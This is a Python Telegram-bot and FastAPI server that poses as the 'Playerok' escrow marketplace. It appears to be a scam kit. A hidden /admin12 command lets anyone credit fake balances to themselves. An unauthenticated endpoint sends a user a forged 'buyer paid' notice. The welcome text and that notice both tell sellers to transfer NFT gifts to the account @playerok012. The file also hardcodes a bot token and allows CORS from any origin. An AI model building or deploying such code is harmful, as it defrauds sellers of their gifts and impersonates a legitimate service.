import asyncio import logging import sqlite3 from fastapi import FastAPI, HTTPException from fastapi.responses import HTMLResponse from fastapi.middleware.cors import CORSMiddleware from pydantic import BaseModel from aiogram import Bot, Dispatcher, types, F from aiogram.filters import Command from aiogram.fsm.context import FSMContext from aiogram.fsm.state import State, StatesGroup from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
--- НАСТРОЙКИ ---
TOKEN = "9187770017:AAG3X7oTfwoyiMhWmZv_cuNHZY-zISmBzMA" WEB_APP_URL = "https://playerok4-2.onrender.com" # Ваша ссылка на Render
bot = Bot(token=TOKEN) dp = Dispatcher() app = FastAPI()
Разрешаем CORS
app.add_middleware( CORSMiddleware, allow_origins=[""], allow_credentials=True, allow_methods=[""], allow_headers=["*"], )
--- БАЗА ДАННЫХ ---
def init_db(): conn = sqlite3.connect("playerok.db", check_same_thread=False) cursor = conn.cursor() cursor.execute(''' CREATE TABLE IF NOT EXISTS users ( user_id INTEGER PRIMARY KEY, username TEXT, rub REAL DEFAULT 0.0, usd REAL DEFAULT 0.0, uah REAL DEFAULT 0.0, byn REAL DEFAULT 0.0, stars INTEGER DEFAULT 0, ton REAL DEFAULT 0.0 ) ''') cursor.execute(''' CREATE TABLE IF NOT EXISTS deals ( deal_id TEXT PRIMARY KEY, user_id INTEGER, item_name TEXT, amount REAL, status TEXT ) ''') conn.commit() conn.close()
init_db()
Получение или создание баланса пользователя для бота
def get_user_balance_db(user_id: int): conn = sqlite3.connect("playerok.db", check_same_thread=False) cursor = conn.cursor() cursor.execute("SELECT rub, usd, uah, byn, stars, ton FROM users WHERE user_id = ?", (user_id,)) row = cursor.fetchone() if not row: cursor.execute("INSERT INTO users (user_id, rub, usd, uah, byn, stars, ton) VALUES (?, 0, 0, 0, 0, 0, 0)", (user_id,)) conn.commit() row = (0.0, 0.0, 0.0, 0.0, 0, 0.0) conn.close() return {"rub": row[0], "usd": row[1], "uah": row[2], "byn": row[3], "stars": row[4], "ton": row[5]}
--- FSM ДЛЯ АДМИНКИ ---
class AdminStates(StatesGroup): waiting_for_currency = State() waiting_for_amount = State()
--- TELEGRAM БОТ ---
@dp.message(Command("start")) async def send_welcome(message: types.Message): user_id = message.from_user.id user_name = message.from_user.first_name or "Пользователь" bal = get_user_balance_db(user_id)
welcome_text = (
    f"👋 **Добро пожаловать, {user_name}!**\n\n"
    f"🎮 **Playerok** — маркетплейс безопасных сделок.\n\n"
    f"💰 **Ваш баланс:**\n"
    f"• Рубли (₽): `{bal['rub']:.2f}`\n"
    f"• Доллары ($): `{bal['usd']:.2f}`\n"
    f"• Гривны (₴): `{bal['uah']:.2f}`\n"
    f"• Белорусские рубли (BYN): `{bal['byn']:.2f}`\n"
    f"• Звёзды (⭐): `{bal['stars']}`\n"
    f"• TON: `{bal['ton']:.2f}`\n\n"
    f"📜 **Правила сервиса:**\n"
    f"1. Все сделки проводятся строго через гаранта.\n"
    f"2. ⚠️ **Важно:** При оплате NFT-подарка передайте его строго на аккаунт **@playerok012**.\n\n"
    f"👇 Нажмите кнопку ниже, чтобы открыть приложение."
)

keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение Playerok", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/playerok012")]
    ]
)

await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)
@dp.message(Command("admin12")) async def admin_panel(message: types.Message): keyboard = InlineKeyboardMarkup( inline_keyboard=[ [InlineKeyboardButton(text="💳 Пополнить баланс СЕБЕ", callback_data="add_self")] ] ) await message.answer("👑 Админ-панель Playerok\n\nВыберите действие:", parse_mode="Markdown", reply_markup=keyboard)
@dp.callback_query(F.data == "add_self") async def choose_currency_self(callback: types.CallbackQuery, state: FSMContext): await state.update_data(target_id=callback.from_user.id) keyboard = InlineKeyboardMarkup( inline_keyboard=[ [InlineKeyboardButton(text="Рубли (₽)", callback_data="curr_rub"), InlineKeyboardButton(text="Доллары ($)", callback_data="curr_usd")], [InlineKeyboardButton(text="Гривны (₴)", callback_data="curr_uah"), InlineKeyboardButton(text="Бел. рубли (BYN)", callback_data="curr_byn")], [InlineKeyboardButton(text="Звёзды (⭐)", callback_data="curr_stars"), InlineKeyboardButton(text="TON", callback_data="curr_ton")] ] ) await callback.message.edit_text("Выберите валюту для пополнения:", reply_markup=keyboard) await state.set_state(AdminStates.waiting_for_currency)
@dp.callback_query(AdminStates.waiting_for_currency, F.data.startswith("curr_")) async def process_currency(callback: types.CallbackQuery, state: FSMContext): currency = callback.data.split("_")[1] await state.update_data(currency=currency) await callback.message.edit_text(f"Введите сумму пополнения для {currency.upper()} (отправьте число сообщением):", parse_mode="Markdown") await state.set_state(AdminStates.waiting_for_amount)
@dp.message(AdminStates.waiting_for_amount) async def process_amount(message: types.Message, state: FSMContext): try: amount = float(message.text) except ValueError: await message.answer("❌ Ошибка! Введите корректное число.") return
data = await state.get_data()
target_id = data['target_id']
currency = data['currency']

conn = sqlite3.connect("playerok.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(f"UPDATE users SET {currency} = {currency} + ? WHERE user_id = ?", (amount, target_id))
conn.commit()
conn.close()

await message.answer(f"✅ Успешно начислено `+{amount}` `{currency.upper()}` пользователю `{target_id}`!", parse_mode="Markdown")
await state.clear()
--- FASTAPI API ЭНДПОИНТЫ ---
@app.get("/", response_class=HTMLResponse) async def serve_frontend(): """Отдает файл index.html при заходе на сайт, исправляя ошибку 404""" try: with open("index.html", "r", encoding="utf-8") as f: return f.read() except FileNotFoundError: return "<h3>Файл index.html не найден в корне проекта! Загрузите его вместе с server.py</h3>"
@app.get("/api/get_user/{user_id}") def get_user(user_id: int): return get_user_balance_db(user_id)
class DealCreate(BaseModel): deal_id: str user_id: int item_name: str amount: float
@app.post("/api/pay_deal") async def pay_deal(deal: DealCreate): conn = sqlite3.connect("playerok.db", check_same_thread=False) cursor = conn.cursor() cursor.execute("INSERT OR REPLACE INTO deals VALUES (?, ?, ?, ?, 'paid')", (deal.deal_id, deal.user_id, deal.item_name, deal.amount)) conn.commit() conn.close()
kb = InlineKeyboardMarkup(
    inline_keyboard=[[
        InlineKeyboardButton(text="🔍 Зайти в сделку", web_app=WebAppInfo(url=f"{WEB_APP_URL}?deal={deal.deal_id}"))
    ]]
)

msg_text = (
    f"✅ **Покупатель оплатил сделку #{deal.deal_id}!**\n\n"
    f"📦 Товар: **{deal.item_name}**\n"
    f"💰 Сумма: **{deal.amount} ₽**\n\n"
    f"⚠️ **ВНИМАНИЕ:** Передайте NFT-подарок строго на аккаунт **@playerok012**, иначе гарант не подтвердит выдачу!"
)

await bot.send_message(chat_id=deal.user_id, text=msg_text, parse_mode="Markdown", reply_markup=kb)
return {"status": "ok"}
--- ФОНОВЫЙ ЗАПУСК БОТА И СЕРВЕРА ---
async def main(): # Запускаем поллинг бота в фоновом режиме asyncio.create_task(dp.start_polling(bot)) print("Бот и FastAPI сервер успешно инициализированы!")
@app.on_event("startup") on_startup = main
